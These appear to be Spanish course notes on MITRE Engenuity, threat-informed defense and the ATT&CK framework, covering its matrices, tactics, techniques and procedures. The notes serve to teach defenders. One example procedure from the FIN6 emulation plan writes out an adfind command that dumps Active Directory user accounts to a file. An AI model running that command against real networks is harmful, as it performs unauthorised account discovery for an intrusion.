# Introduction
## 1- ¿Quién es MITRE Engenuity?

Si ha trabajado en ciberseguridad durante más de un año, probablemente esté familiarizado con el término **CVE**,  
abreviatura de **Common Vulnerabilities and Exposures**.  
¿Qué pasa con el marco **ATT&CK**? El nombre más largo de este llamativo acrónimo es **Adversarial Tactics, Techniques, and Common Knowledge (Tácticas, técnicas y conocimiento común)**. 

Estos son dos ejemplos de las principales contribuciones que la organización sin fines de lucro MITRE Corporation ha hecho al  
mundo de la seguridad cibernética.  

MITRE es conocido en algo más que el mundo de la cibernética. También trabajan en defensa e inteligencia, aviación, sistemas civiles, seguridad nacional, poder judicial y atención médica. Todos estos  
recursos, incluida la seguridad cibernética, están financiados por el gobierno federal y trabajan para resolver algunos de los problemas más grandes de la nación a través de la investigación y el  
desarrollo independientes. 

MITRE hace un buen trabajo al envolver un vocabulario común y crear procesos/marcos flexibles  que pueden ayudar a unir a nuestra industria.  

Sabemos que MITRE hace mucho más que ATT&CK, pero este curso está realmente enfocado en el  Marco ATT&CK. Por lo tanto, deberíamos mirar más de cerca al **grupo dentro de MITRE que es  
responsable de todo lo relacionado con ATT&CK. Ese grupo es MITRE Engenuity**.  

MITRE Engenuity, una entidad distinta dentro de MITRE Corporation, se centra en el desarrollo y la gestión del marco ATT&CK. Su **objetivo es impulsar la innovación y la colaboración en el campo de la ciberseguridad reuniendo a expertos, investigadores y  organizaciones de los sectores público y privado*.

Al aprovechar su posición única como entidad independiente y sin fines de lucro, MITRE Engenuity puede  fomentar un entorno confiable para que las organizaciones colaboren, compartan conocimientos y desarrollen soluciones de vanguardia para abordar los desafíos emergentes de ciberseguridad. Este enfoque colaborativo permite al grupo mejorar continuamente el marco ATT&CK, asegurando que siga siendo relevante y eficaz para abordar el cambiante panorama de amenazas.

Además del marco ATT&CK, MITRE Engenuity también trabaja en otras iniciativas destinadas a  mejorar la ciberseguridad, como el Center for Threat-Informed Defense, que se centra en el desarrollo de soluciones prácticas para fortalecer la ciberdefensa, y el programa Cybersecurity Testing and Evaluation, que tiene como objetivo validar la eficacia de las herramientas y soluciones de seguridad en escenarios del mundo real. 

Al promover la adopción del Marco ATT&CK e impulsar la colaboración entre  las partes interesadas en la ciberseguridad, MITRE Engenuity desempeña un papel crucial en la configuración del futuro de  
la ciberseguridad y ayuda a las organizaciones a mantenerse un paso por delante de los adversarios. A través de su trabajo, el grupo se ha ganado la reputación de ser una autoridad confiable y un líder de opinión en el campo, y sus contribuciones han tenido un impacto significativo en la forma en que las organizaciones abordan la defensa cibernética.

### Centro para la Defensa Informada sobre Amenazas (CTID)

  
El Center for Threat-Informed Defense es una organización de investigación y  desarrollo sin fines de lucro, financiada con fondos privados, operada por MITRE Engenuity que está compuesta por organizaciones participantes de todo el mundo que poseen equipos de seguridad altamente sofisticados.

El Centro para la Defensa Informada sobre Amenazas (CTID, por sus siglas en inglés) se fundó a partir de la necesidad de mantener y acelerar la evolución del proyecto ATT&CK y otros recursos disponibles públicamente que son críticos para la defensa cibernética.  

El Centro para la Defensa Informada sobre Amenazas (CTID, por sus siglas en inglés) participa en proyectos de investigación y desarrollo con sus miembros, que provienen de una variedad de industrias, incluidas organizaciones sin fines de lucro de infraestructura crítica, seguridad, tecnología y ciberseguridad. 

El objetivo de estas colaboraciones es avanzar en el estado del arte y la práctica de la defensa informada sobre amenazas.
  
El CTID lleva a cabo investigaciones en varias áreas, entre ellas:

- Mejorar la comprensión global de las técnicas de los adversarios, como la expansión de la ATT&CK a los nuevos dominios tecnológicos, como la computación en la nube.
- Medir la evolución del comportamiento del adversario, como la creación de una calculadora de "técnicas principales" que enumere las técnicas del adversario que tienen más probabilidades de afectar a su organización.
- Permitir la evaluación continua de las defensas a través del desarrollo, el intercambio y la automatización de los manuales de estrategias de emulación de adversarios. Hemos visto esto en el lanzamiento de varios planes de emulación de adversarios..
- Identificar e investigar nuevas formas de frustrar las técnicas de ATT&CK en las etapas de defensa de Proteger, Detectar y Responder.

Todos los resultados de investigación y desarrollo del CTID se ponen a disposición del mundo para maximizar su impacto.

### Evaluaciones de ATT&CK

Las evaluaciones de ATT&CK son un componente crítico de la iniciativa más amplia de ATT&CK, cuyo objetivo es evaluar la eficacia de diversas soluciones de ciberseguridad en la detección y mitigación de amenazas del mundo real.

Al simular las tácticas, técnicas y procedimientos (TTP) de adversarios conocidos, estas evaluaciones brindan una oportunidad única para que los proveedores y profesionales de seguridad comprendan mejor  
las fortalezas y debilidades de sus productos y servicios.

### Proceso de evaluación objetivo y transparente

![[Pasted image 20240707191047.png]]
  
Las evaluaciones ATT&CK de MITRE Engenuity se centran en proporcionar una evaluación objetiva, transparente e independiente  del proveedor de las soluciones de ciberseguridad.

No clasifican ni califican los productos, sino que ofrecen un análisis exhaustivo de cómo se comporta cada solución frente a  
comportamientos específicos del adversario. 

Esto permite a las organizaciones tomar decisiones **informadas** a la hora de seleccionar u optimizar sus herramientas y estrategias de  
ciberseguridad.

### Componentes clave de las evaluaciones  

Las evaluaciones se basan en los siguientes componentes clave:

- Emulación de adversarios: Las evaluaciones simulan ataques del mundo real imitando los TTP de adversarios conocidos. Esto ayuda a evaluar la eficacia de las soluciones de ciberseguridad para detectar y mitigar las amenazas reales.
- Marco ATT&CK: Las evaluaciones utilizan el Marco ATT&CK como un lenguaje común para describir los comportamientos de los adversarios, lo que permite un proceso de evaluación estandarizado y consistente.
- Apertura y colaboración: El proceso de evaluación es transparente y fomenta la colaboración entre proveedores, profesionales y la comunidad de ciberseguridad en general. Todos los hallazgos y resultados se comparten públicamente para impulsar la mejora continua y el intercambio de conocimientos.

### Beneficios de las evaluaciones de ATT&CK

Las evaluaciones ATT&CK de MITRE Engenuity ofrecen varios beneficios a la comunidad de ciberseguridad:

- Toma de decisiones informada: Al proporcionar información objetiva y detallada sobre el rendimiento de las soluciones de ciberseguridad, las evaluaciones ayudan a las organizaciones a tomar decisiones informadas sobre las herramientas y estrategias que mejor satisfacen sus necesidades únicas.
- Mejora continua: Las evaluaciones sirven como catalizador para que los proveedores mejoren sus productos y servicios, ya que identifican brechas y áreas de mejora.
- Colaboración de la industria: Al fomentar un espíritu de colaboración y apertura, las evaluaciones ayudan a crear una comunidad de ciberseguridad más sólida que trabaja en conjunto para abordar las amenazas y los desafíos emergentes.


## 2- Defensa informada sobre amenazas

Antes de hablar de MITRE ATT&CK, vamos a introducir el concepto de Defensa Informada sobre Amenazas.  

![[Pasted image 20240630113304.png]]

Una defensa informada sobre amenazas es un enfoque proactivo de la ciberseguridad que utiliza tres elementos para proporcionar un bucle de retroalimentación en evolución a su equipo de seguridad:

- Análisis de inteligencia de amenazas cibernéticas
- Enfrentamiento defensivo de la amenaza
- Intercambio y colaboración

Echemos un vistazo a cada uno de ellos individualmente.

## Análisis de inteligencia de amenazas cibernéticas

Una defensa informada sobre amenazas comienza primero con estar informado sobre amenazas y estar informado requiere inteligencia sobre amenazas.

Con inteligencia, puedes entender quién es probable que te ataque y cómo es probable que lo hagan. Esta información le da la base para las defensas. 

![[Pasted image 20240630113954.png]]
El análisis de inteligencia de amenazas toma datos de inteligencia existentes, como TTP, hashes de malware o nombres de dominio, y aplica inteligencia humana para fortalecer las defensas cibernéticas. Esto mejora las formas  de anticipar, prevenir, detectar y responder a los ciberataques.

### CRÍTICOS DE MITRE

![[Pasted image 20240630113346.png]]

CRITS es una herramienta gratuita y de código abierto diseñada para analistas y profesionales de la seguridad que trabajan en la defensa contra amenazas. Desarrollado en 2010, su principal objetivo es ofrecer a la comunidad de seguridad una plataforma adaptable y abierta para analizar y colaborar en datos de amenazas. Los CRIT pueden configurarse localmente para uso privado o compartirse con organizaciones de confianza para una defensa cooperativa. CRITS hace un puñado de cosas que ayudan con el análisis de inteligencia, tales como:

- Recopilación y archivado de artefactos de ataque
- Asociar artefactos con etapas del ciclo de vida del ciberataque
- Realización de ingeniería inversa de malware
- Seguimiento de las influencias ambientales
- Conectar todo esto para dar forma y priorizar las defensas y reaccionar a los incidentes CRITS en sí mismo está fuera del alcance de este curso, pero nos da una buena ilustración de cuáles son las características de la inteligencia de amenazas cibernéticas.

Si desea probar CRITS por sí mismo, puede visitar la [página de inicio de CRITS.](http://crits.github.io/)

## Enfrentamiento defensivo de la amenaza

El Compromiso Defensivo de la Amenaza toma lo que ha aprendido del Análisis de Inteligencia y  le permite buscar indicadores de un ataque cibernético pendiente, activo o exitoso. Las herramientas de simulación de brechas y ataques  (BAS) encajan bien aquí, ya que toman los modelos de comportamiento descubiertos durante el análisis de inteligencia y su uso le permiten automatizar las pruebas y la generación de informes sobre cómo se ven esos patrones de comportamiento en nuestra empresa. 

Estos resultados de la simulación retroalimentan su análisis de inteligencia de amenazas y el siguiente elemento del que vamos a hablar: el uso compartido y la colaboración enfocados.

## Enfocados en Intercambio y colaboración

Al compartir los TTP de los actores de amenazas a través de estándares como STIX y TAXII, la comunidad de seguridad se beneficia en conjunto. Si forma parte de una organización grande con diferentes grupos de seguridad, la información compartida entre grupos en un formato estándar puede ayudar a su empresa a crear una defensa informada contra amenazas.  

Grupos como el Centro para la Defensa Informada sobre Amenazas (CTID, por sus siglas en inglés) de MITRE reúnen a sofisticados  
equipos de seguridad de organizaciones líderes de todo el mundo para ampliar la comprensión global de los comportamientos de los adversarios. Lo logran mediante la creación de enfoque, colaboración y coordinación para acelerar la innovación en la defensa informada sobre amenazas, basándose en el marco MITRE ATT&CK.

# The ATT&CK Framework

## Introducing the ATT&CK Framework

![[Pasted image 20240630120340.png]]El marco MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) es un  recurso ampliamente utilizado para comprender y defenderse de las amenazas cibernéticas. 

El marco fue desarrollado por MITRE, una organización sin fines de lucro que opera centros de investigación y desarrollo para el gobierno de los Estados Unidos (Estados Unidos). 

Los orígenes del marco se remontan a principios de la década de 2000, cuando MITRE comenzó a trabajar con el gobierno de los EE. UU. para desarrollar un enfoque integral para comprender y defenderse contra las Amenazas Persistentes Avanzadas (APT) (en inglés _Advanced Persistent Threat_).

Este trabajo condujo a la creación de la matriz MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) en 2013, que inicialmente se centró en los grupos de amenazas APT y sus tácticas, técnicas y procedimientos (TTP).

A lo largo de los años, el marco ha evolucionado para incluir una gama más amplia de actores de amenazas, plataformas y casos de uso. En 2016, el marco se puso a disposición del público y, desde entonces, se ha convertido en un recurso ampliamente utilizado por organizaciones de todos los tamaños e industrias. 

El marco MITRE ATT&CK es un recurso importante y ampliamente utilizado en el campo de la ciberseguridad. Proporciona una comprensión integral de las tácticas, técnicas y procedimientos utilizados por los adversarios cibernéticos, lo que permite a las organizaciones identificar, detectar y  responder mejor a las amenazas cibernéticas. 

Como recordará, la inteligencia de amenazas y las decisiones basadas en datos son una parte importante de una defensa informada sobre amenazas. Comprender cómo operan sus adversarios es increíblemente valioso para defender su empresa.

El marco se basa en observaciones del mundo real de ataques reales, lo que significa que se actualiza constantemente con nueva información y refleja el panorama de amenazas más reciente. Además, el marco ATT&CK cubre una amplia gama de actores de amenazas, plataformas y casos de uso, y se puede utilizar no solo para la detección y la defensa, sino también para planificar y priorizar las inversiones en seguridad, medir la eficacia de los controles de seguridad y comunicarse con las partes interesadas. 

El marco ATT&CK cuenta con una comunidad de investigadores, profesionales y entusiastas que contribuyen a su desarrollo y mejora.

MITRE permite la contribución al Marco ATT&CK a través de la presentación de:

- Nuevas técnicas y subtécnicas
- Nuevas técnicas y subtécnicas para macOS, Linux, la nube e [[ICS (Sistemas de Control Industrial)]].
- Inteligencia de amenazas
- Fuentes de datos, como datos de registro de red o de punto de conexión para las técnicas utilizadas en incidentes
- Sus casos de uso

La Organización MITRE tiene una página completa en su sitio web sobre cómo contribuir al Marco ATT&CK (https://attack.mitre.org/resources/contribute/). Recomendamos buscar allí como punto de partida para ayudar a mantener ATT&CK actualizado.  

El marco ha sido ampliamente adoptado por la industria, muchos proveedores y organizaciones han desarrollado productos y servicios que se basan o se integran con el marco ATT&CK.  

Además, puede ayudar a las organizaciones a priorizar las vulnerabilidades y las áreas de debilidad, y  demostrar el cumplimiento de las regulaciones y estándares.


# Matrices ATT&CK 

El marco ATT&CK es más que la matriz única que está acostumbrado a ver. 

Hay 3 matrices disponibles para representar el marco ATT&CK en diferentes contextos.

Esas matrices son:

- La matriz empresarial
- La matriz móvil
- La matriz ICS

## Matriz empresarial

La Matriz Empresarial se compone de tácticas y técnicas que afectan a las siguientes plataformas:

- Windows
- macOS
- Linux
- PRE
- Azure AD
- Office 365
- Google Workspace
- SaaS
- IaaS
- Red
- Containers

Como puede ver, hay una amplia variedad de plataformas locales basadas en host, plataformas basadas en la nube, amenazas de red y contenedores representados en esta matriz. Lo más probable es que  
la matriz empresarial sea la matriz con la que está familiarizado porque es muy vasta, pero detallada. Por esas razones, es la matriz a la que haremos referencia a lo largo de esta clase, a menos que se indique lo contrario.

## Matriz móvil

La matriz móvil cubre técnicas que involucran el acceso a dispositivos y efectos basados en la red que pueden ser utilizados por adversarios sin acceso a dispositivos. Los sistemas operativos iOS y Android están cubiertos en esta matriz.

La matriz móvil consta de 12 tácticas:

- Acceso inicial
- Ejecución
- Persistencia
- Escalada de privilegios
- Evasión de defensa
- Acceso a credenciales
- Descubrimiento
- Movimiento lateral
- Colección
- Comando y control
- Exfiltración
- Impacto

Dentro de la Matrix encontrarás técnicas que se pueden aplicar tanto a la plataforma empresarial como a la móvil. También encontrarás técnicas que se utilizan específicamente en plataformas móviles. Una de estas técnicas son las notificaciones de acceso.  

La descripción de las notificaciones de acceso dice:  
"Los adversarios pueden recopilar datos dentro de las notificaciones enviadas por el sistema operativo u otras aplicaciones. Las notificaciones pueden contener datos confidenciales, como códigos de autenticación de un solo uso enviados por SMS, correo electrónico u otros medios. En el caso del acceso a credenciales, los adversarios pueden intentar interceptar el código de un solo uso enviado al dispositivo. Los adversarios también pueden descartar las notificaciones para evitar que el usuario se dé cuenta de que la notificación ha llegado y pueden activar los botones de acción contenidos en las notificaciones".

## Matriz ICS

La matriz ICS cubre tácticas y técnicas que se aplican a los sistemas de control industrial. Al igual que la matriz móvil, hay 12 tácticas. Sin embargo, te darás cuenta de que no todas esas tácticas son iguales. 

Las 12 tácticas de la Matriz ICS incluyen:

- Acceso inicial
- Ejecución
- Persistencia
- Escalada de privilegios
- Evasión
- Descubrimiento
- Movimiento lateral
- Colección
- Comando y control
- Inhibir la función de respuesta
- Deteriorar el control del proceso
- Impacto

Es posible que hayas observado que ciertas tácticas en la matriz ICS son exclusivas de ella. Por ejemplo, la función de inhibición de respuesta incluye la supresión de alarmas, el bloqueo de mensajes de comandos y la manipulación de imágenes de E/S como técnicas. Otra táctica es la Táctica de Control de Procesos de Perjuicio, que abarca la E/S de Fuerza Bruta y el Mensaje de Informes de Suplantación de Identidad como técnicas.

La función de respuesta de inhibición se refiere a los métodos empleados por los ciberdelincuentes para obstaculizar las  
medidas de protección implementadas para los procesos y productos. Por otro lado, la táctica de deterioro del control de procesos se refiere a las formas en que los atacantes pueden interferir con la lógica de control y provocar impactos adversos en los procesos que se gestionan en el entorno objetivo.


## ¿Qué son las TTP?

Las tácticas, técnicas y procedimientos son conceptos clave en el marco de ATT&CK.

- Las tácticas se refieren a los objetivos técnicos de un adversario. Estos objetivos podrían incluir el robo de datos confidenciales, la interrupción de las operaciones o el establecimiento de un punto de apoyo en la red de un objetivo.
- Las técnicas son los comportamientos que muestra un adversario cuando intenta lograr estos objetivos. Por ejemplo, un adversario podría utilizar correos electrónicos de phishing para obtener acceso inicial a una red, seguido de técnicas como el movimiento lateral y la escalada de privilegios para obtener un acceso más profundo.
- Los procedimientos son implementaciones específicas de técnicas. Por ejemplo, un procedimiento para el movimiento lateral puede implicar el uso de credenciales robadas para iniciar sesión en otro sistema, mientras que otro procedimiento puede implicar el uso de una herramienta como Remote Desktop Protocol (RDP) para conectarse a un sistema. Juntos, estos conceptos proporcionan una comprensión integral de las formas en que operan los adversarios cibernéticos y pueden ayudar a las organizaciones a identificar, detectar y responder a las amenazas cibernéticas.

### Piensa en esto en términos de tu día:

Tienes varias cosas que haces todos los días que se pueden dividir en categorías u objetivos amplios. Estas podrían ser cosas como llegar al trabajo de manera segura o mantenerse saludable. Estas son sus tácticas.

Tienes diferentes maneras de alcanzar estos objetivos. Para algo como llegar al trabajo de manera segura, puede conducir al trabajo. Es posible que camine al trabajo. Incluso puede tener un viaje mixto de conducir, caminar y transporte público. 

En términos de mantenerse saludable, puede emplear técnicas como lavarse las manos, caminar o levantar pesas. Tenga en cuenta que la misma técnica de dar un paseo en realidad se usó en ambas tácticas para mantenerse saludable y llegar al trabajo de manera segura. **Las técnicas pueden abarcar múltiples tácticas**.

Continuaremos con "dar un paseo" como nuestra técnica, ya que abarca ambas tácticas. El mapa que usaría con las indicaciones paso a paso para su caminata podría ser un procedimiento para la técnica de dar un paseo.

Este es el principio organizativo básico del marco MITRE ATT&CK, por lo que es importante memorizarlos.

## Táctica

La matriz empresarial divide todas las técnicas en 14 tácticas, cada una de las cuales tiene un propósito específico en el ciclo de vida del adversario.  

![[Pasted image 20240702162510.png]]
De izquierda a derecha, la primera táctica es el **reconocimiento**, que consiste en que los adversarios recopilen activa o pasivamente información sobre un objetivo potencial, como detalles sobre la organización de la víctima, la infraestructura o el personal. Esta información se puede utilizar para respaldar la selección de objetivos y ayudar en otras fases del ciclo de vida del adversario.  

La segunda táctica es el **desarrollo de recursos**, en el que los adversarios crean, compran o comprometen recursos, como infraestructura, cuentas o capacidades, que se pueden utilizar para respaldar la segmentación. 

La tercera táctica es el **acceso inicial**, que implica el uso de varios vectores de entrada para afianzarse en la red de destino. Estos puntos de apoyo pueden permitir el acceso continuo o pueden tener un uso limitado debido al cambio de contraseñas.  

La cuarta táctica es **la ejecución**, que da como resultado que el código controlado por el adversario se ejecute en un sistema local o  
remoto. Esta táctica a menudo se combina con técnicas de otras tácticas para lograr objetivos más amplios.  

La quinta táctica es **la persistencia**, en la que los adversarios utilizan técnicas para mantener el acceso a los sistemas a través de reinicios, credenciales modificadas y otras interrupciones que podrían cortar su acceso.

La sexta táctica es **la escalada de privilegios**, en la que los adversarios utilizan técnicas para obtener permisos de mayor nivel en un sistema o red. Esta táctica a menudo se superpone con las técnicas de persistencia. 

La séptima táctica es la **evasión de defensa**, en la que los adversarios utilizan técnicas para evitar ser detectados a lo largo de su compromiso. 

La octava táctica es **el acceso a credenciales**, en el que los adversarios roban credenciales, como nombres de cuentas y contraseñas.  

La novena táctica es **el descubrimiento**, en el que los adversarios utilizan técnicas para obtener conocimientos sobre el sistema y la  
red interna.

La décima táctica es el **movimiento lateral**, aquí es donde los adversarios utilizan técnicas para ingresar y controlar otros sistemas remotos en una red.

La undécima táctica es la **recopilación**, en la que los adversarios utilizan técnicas para recopilar información y las fuentes de las que se recopila información que son relevantes para cumplir sus objetivos.  

La duodécima táctica es **el Comando y Control**, estas son técnicas que utilizan los adversarios para comunicarse con los sistemas bajo su control dentro de la red víctima.  

La decimotercera táctica es **la exfiltración**, en la que un adversario utiliza técnicas para robar datos de su red.

Y, por último, **el impacto**, en el que los adversarios utilizan técnicas para interrumpir la disponibilidad o comprometer la integridad mediante la manipulación de los procesos empresariales y operativos.

Es importante tener en cuenta que estas tácticas no son mutuamente excluyentes y, a menudo, se utilizan en combinación para lograr los objetivos del adversario.

### Tácticas empresariales fuente Mitre

Las tácticas representan el "por qué" de una técnica o subtécnica ATT&CK. Es el objetivo táctico del adversario: la razón para realizar una acción. Por ejemplo, un adversario puede querer lograr el acceso a las credenciales.

###### Tácticas empresariales: 14

| IDENTIFICACIÓN                                    | Nombre                                                             | Descripción                                                                                              |
| ------------------------------------------------- | ------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- |
| [TA0043](https://attack.mitre.org/tactics/TA0043) | [Reconocimiento](https://attack.mitre.org/tactics/TA0043)          | El adversario está tratando de recopilar información que pueda usar para planificar operaciones futuras. |
| [TA0042](https://attack.mitre.org/tactics/TA0042) | [Desarrollo de recursos](https://attack.mitre.org/tactics/TA0042)  | El adversario está tratando de establecer recursos que puedan utilizar para apoyar las operaciones.      |
| [TA0001](https://attack.mitre.org/tactics/TA0001) | [Acceso inicial](https://attack.mitre.org/tactics/TA0001)          | El adversario está tratando de entrar en su red.                                                         |
| [TA0002](https://attack.mitre.org/tactics/TA0002) | [Ejecución](https://attack.mitre.org/tactics/TA0002)               | El adversario está intentando ejecutar código malicioso.                                                 |
| [TA0003](https://attack.mitre.org/tactics/TA0003) | [Persistencia](https://attack.mitre.org/tactics/TA0003)            | El adversario está tratando de mantener su posición.                                                     |
| [TA0004](https://attack.mitre.org/tactics/TA0004) | [Escalada de privilegios](https://attack.mitre.org/tactics/TA0004) | El adversario está tratando de obtener permisos de mayor nivel.                                          |
| [TA0005](https://attack.mitre.org/tactics/TA0005) | [Evasión de defensa](https://attack.mitre.org/tactics/TA0005)      | El adversario está tratando de evitar ser detectado.                                                     |
| [TA0006](https://attack.mitre.org/tactics/TA0006) | [Acceso a credenciales](https://attack.mitre.org/tactics/TA0006)   | El adversario está tratando de robar nombres de cuentas y contraseñas.                                   |
| [TA0007](https://attack.mitre.org/tactics/TA0007) | [Descubrimiento](https://attack.mitre.org/tactics/TA0007)          | El adversario está tratando de averiguar su entorno.                                                     |
| [TA0008](https://attack.mitre.org/tactics/TA0008) | [Movimiento lateral](https://attack.mitre.org/tactics/TA0008)      | El adversario está tratando de moverse a través de su entorno.                                           |
| [TA0009](https://attack.mitre.org/tactics/TA0009) | [Colección](https://attack.mitre.org/tactics/TA0009)               | El adversario está tratando de recopilar datos de interés para su objetivo.                              |
| [TA0011](https://attack.mitre.org/tactics/TA0011) | [Comando y control](https://attack.mitre.org/tactics/TA0011)       | El adversario está tratando de comunicarse con los sistemas comprometidos para controlarlos.             |
| [TA0010](https://attack.mitre.org/tactics/TA0010) | [Exfiltración](https://attack.mitre.org/tactics/TA0010)            | El adversario está tratando de robar datos.                                                              |
| [TA0040](https://attack.mitre.org/tactics/TA0040) | [Impacto](https://attack.mitre.org/tactics/TA0040)                 | El adversario está tratando de manipular, interrumpir o destruir sus sistemas y datos.                   |
## Técnicas y subtécnicas

Al momento de escribir este curso, la versión actual del marco ATT&CK es la versión 13. En esta versión, el marco consta de 196 técnicas que abarcan las 14 tácticas. No tenemos tiempo para repasar cada una de estas técnicas, pero sí tenemos tiempo para repasar algunos ejemplos para que puedas entender mejor qué son estas técnicas y cómo se utilizan en el contexto de ATT&CK.

### Sub-Técnicas

En la versión 8.0 de ATT&CK Framework, se agregó una nueva clasificación. Esa clasificación se denomina "subtécnica". Las subtécnicas son una forma de desglosar y describir aún más los  
métodos específicos utilizados por los adversarios para lograr sus objetivos. Cada técnica en el marco se compone de una o más subtécnicas, lo que proporciona una comprensión más granular de las  
técnicas y cómo se utilizan. La versión 13 del marco incluye 411 subtécnicas.

### Recopilar información de la red de víctimas (T1590)

Esta técnica tiene que ver con la recopilación de información sobre la red de una víctima para planificar y ejecutar un ataque. 

Esta información puede incluir detalles sobre la infraestructura y la organización de la red, como los rangos de IP, los nombres de dominio y la topología. 

Los adversarios pueden recopilar esta información a través de varios medios, como escanear activamente la red o enviar correos electrónicos de phishing para engañar a las personas para que revelen información.

Además, esta información también puede obtenerse de fuentes disponibles públicamente, como bases de datos en línea.

![[Pasted image 20240703191448.png]]

Como puede ver, la técnica también enumera un ejemplo de procedimiento. HAFNIUM, un grupo que figura como parte del marco ATT&CK (más adelante hablaremos de los grupos), recopiló los nombres de dominio completos (FQDN) para los servidores Exchange específicos en el entorno de la víctima. Esto nos dice específicamente qué hizo el adversario para realizar la acción de recopilar información de la red de víctimas.  

También observará que se proporciona una lista de información de mitigación y detección con cada técnica. Hablaremos más sobre mitigaciones y detecciones más adelante en este curso.  

Esta técnica tiene seis subtécnicas, echemos un vistazo a una para ver cuánto más granular se vuelve. Para ello, recurriremos a la subtécnica T1590.006 – Dispositivos de seguridad de red.

Los adversarios que utilizan esta técnica están realizando acciones para comprender qué dispositivos de seguridad hay en su red. Esta información puede ser recopilada por los adversarios a través de acciones de recopilación directa, como el escaneo activo (T1595) o el phishing para obtener información (T1598), o a través de medios más pasivos, como la revisión de ofertas de trabajo en línea para obtener detalles sobre las habilidades requeridas y las tecnologías con las que se relacionan.

### Phishing: Spearphishing Attachment (T1566.001)

Esta subtécnica consiste en enviar un correo electrónico dirigido con un archivo adjunto malicioso en un intento de obtener acceso a los sistemas de la víctima con el objetivo (o la táctica) de acceso inicial (TA0001). 

Otras subtécnicas similares de phishing incluyen Spearphishing Link (T1566.002) y Spearphishing a través de Service (T1566.003). 

El spearphishing es un tipo de ingeniería social que se realiza electrónicamente y se dirige a una persona, organización o campo específico. En esta técnica específica, los atacantes incluyen un archivo adjunto con el correo electrónico y confían en que el destinatario lo abra para ejecutar su plan. 

Algunos de los ejemplos de procedimientos enumerados incluyen:

- APT19 envió correos electrónicos de spearphishing con archivos adjuntos maliciosos en formatos RTF y XLSM para entregar exploits iniciales.
- admin@338 ha enviado correos electrónicos con documentos maliciosos de Microsoft Office adjuntos.
- APT41 envió correos electrónicos de spearphishing con archivos adjuntos como archivos HTML compilados (.chm) paracomprometer inicialmente a sus víctimas.

## Procedimientos

Los procedimientos son uno de los conceptos más difíciles de entender. A primera vista, parecen ser lo mismo que una subtécnica. ¿Qué hace que los procedimientos sean diferentes? Recuerde que las subtécnicas son una forma de desglosar y describir aún más los métodos específicos utilizados por los adversarios para lograr  
sus objetivos.

Nuestro ejemplo anterior de una subtécnica, el archivo adjunto de spearphishing, sigue siendo una acción bastante general que realiza un adversario. Es más específico que "phishing", sin embargo, todavía no proporciona un método exacto para enviar un archivo adjunto en el correo electrónico de phishing.

¿Qué se usar como adjuntos? ¿A qué cuenta(s) se dirigen/envían el correo electrónico? ¿Existe algún software específico que se utilice para crear y enviar el correo electrónico? Todas estas son preguntas que podrían responderse en función de los Procedimientos. 

Por supuesto, es posible que un procedimiento no responda a todas estas preguntas, pero proporcionará un contexto valioso y una visión de los métodos del adversario. Los procedimientos, en esencia, son los detalles más finos de las acciones de un adversario dentro de una subtécnica.

Describen los pasos, herramientas o procesos exactos utilizados por un atacante para llevar a cabo sus objetivos. Al examinar los procedimientos, los profesionales de la seguridad pueden obtener una comprensión más profunda de cómo se desarrolla un ataque, lo que les permite crear estrategias de defensa más personalizadas y efectivas. 

Volviendo a nuestro ejemplo de archivos adjuntos de spearphishing, un procedimiento podría describir el tipo específico de archivo adjunto utilizado (por ejemplo, un PDF malicioso), las cuentas de correo electrónico atacadas o suplantadas, las tácticas de ingeniería social empleadas para engañar a la víctima o el software o herramienta específica utilizada para crear y enviar el correo electrónico de phishing.

Comprender los procedimientos es crucial porque ayudan a las organizaciones para:

- Identificar patrones y tendencias en el comportamiento de los adversarios, lo que permite una atribución de amenazas más precisa.
- Desarrollar medidas de seguridad específicas para contrarrestar amenazas específicas o metodologías de ataques.
- Mejorar las capacidades de inteligencia de amenazas al tener una comprensión más profunda de los TTP de los atacantes.
- Mejorar procesos de respuesta a incidentes sabiendo qué buscar y cómo responder a los procedimientos específicos empleados por un atacante.

Si bien los procedimientos pueden parecer inicialmente similares a subtécnicas, proporcionan una visión más granular de las acciones de un adversario, lo cual es esencial para una estrategia de ciberseguridad integral y efectiva. 

Al comprender y analizar los procedimientos, las organizaciones pueden protegerse mejor contra las amenazas cibernéticas en constante evolución y mejorar su postura de seguridad general.  

Por ejemplo, examinemos los procedimientos del [Plan de Emulación FIN6](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin6) en la [Biblioteca de Emulación de Adversarios](https://github.com/center-for-threat-informed-defense/adversary_emulation_library)  
del CTID.

En este caso, el adversario está tratando de lograr el objetivo (Táctica) de Descubrimiento. Para ello, muestran los comportamientos (Técnicas) de, primero
- Descubrimiento de cuentas y, a continuación
- Descubrimiento de sistemas remotos. 
 
 Las acciones específicas que el adversario está realizando (Procedimientos) para mostrar el comportamiento de la detección de  
cuentas es ejecutando:  

adfind.exe -f (objectcategory=person) >ad_users.txt

Nota: El Procedimiento Alternativo forma parte de los Planes de Emulación del Adversario. Para obtener más información sobre los Planes de Emulación de Adversarios del CTID y el Plan de Emulación de FIN6 específicamente, tomar el curso [Introducción a los Planes de Emulación de FIN6](https://www.academy.attackiq.com/courses/intro-to-fin6-emulation-plans).

## Procedimientos vs. Subtécnicas

![[Pasted image 20240703193829.png]]

## Fuentes de datos y mitigaciones

De acuerdo con el sitio web de ATT&CK, "las fuentes de datos representan los diversos temas/temas de información que pueden ser recopilados por sensores/registros. 

Las fuentes de datos también incluyen componentes de datos, que identifican propiedades/valores específicos de una fuente de datos relevantes para detectar una determinada técnica o subtécnica ATT&CK". Esto significa que para cada fuente de datos debemos esperar una lista de técnicas que pueden ser detectadas por los sensores o registros en una fuente de datos. También debemos esperar información sobre a qué matriz se hace referencia e información sobre cómo detectar la técnica en la fuente de datos.

En la versión 13 de ATT&CK, se ha agregado el pseudocódigo de MITRE CAR en la información de detección para múltiples fuentes de datos. Discutiremos más sobre lo que esto significa más adelante en esta guía cuando hablemos de CAR.

Echemos un vistazo a algunas de estas fuentes de datos para comprender mejor qué son.

### Active Directory (DS0026)

La fuente de datos de Active Directory nos proporciona diferentes componentes de datos que se vinculan a las técnicas de ATT&CK  
y a la información de detección. Por ejemplo, el componente de datos Solicitud de credenciales de Active Directory se ve afectado por Robo o falsificación de certificados de autenticación (T1649). La forma en que se detectaría este tipo de actividad es mediante la supervisión de las solicitudes de certificados de AD CS, así como los certificados emitidos  
en busca de actividad anormal. Esto podría incluir inscripciones inesperadas de certificados y signos de abuso dentro de los atributos del certificado.  

Otros componentes de datos incluidos en el origen de datos de Active Directory incluyen:

- Acceso a objetos de Active Directory
